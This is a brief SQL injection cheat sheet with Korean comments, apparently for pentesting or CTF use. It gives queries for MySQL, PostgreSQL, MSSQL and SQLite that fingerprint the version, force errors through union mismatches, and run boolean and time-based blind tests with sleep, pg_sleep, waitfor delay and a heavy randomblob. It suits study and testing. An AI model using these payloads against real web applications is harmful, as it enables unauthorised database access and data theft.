[MySQL]
// 버전 확인
mysql> select @@version; # select version();
// 에러 출력
mysql> select 1 union select 1, 2;
// blind true or false
mysql> select mid(@@version, 1, 1)='5';
// blind with sleep
mysql> select mid(@@version, 1, 1)='6' and sleep(2);

[PostgreSQL]
// 버전 확인
postgres=$ select version();
// 에러 출력
postgres=$ select 1 union select 1, 2;
// blind true or false
postgres=$ select substr(version(), 1, 1)='P';
// blind with sleep
postgres=$ select substr(version(), 1, 1)='P' and pg_sleep(10);

[MSSQL]
// 버전 확인
> select @@version;
// 에러 출력
> select 1 union select 1, 2;
// blind true or false
> select 1 from test where substring(@@version, 1, 1)='M';
// blind with sleep
select 1 where substring(@@version, 1, 1)='M' and waitfor delay '0:0:5';

[SQLite]
// 버전 확인
sqlite> select sqlite_version();
// 에러 출력
sqlite> select 1 union select 1, 2;
// blind true or false
sqlite> select substr(sqlite_version(), 1, 1)='3';
// blind with sleep
select case when substr(sqlite_version(), 1, 1)='3' then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end;
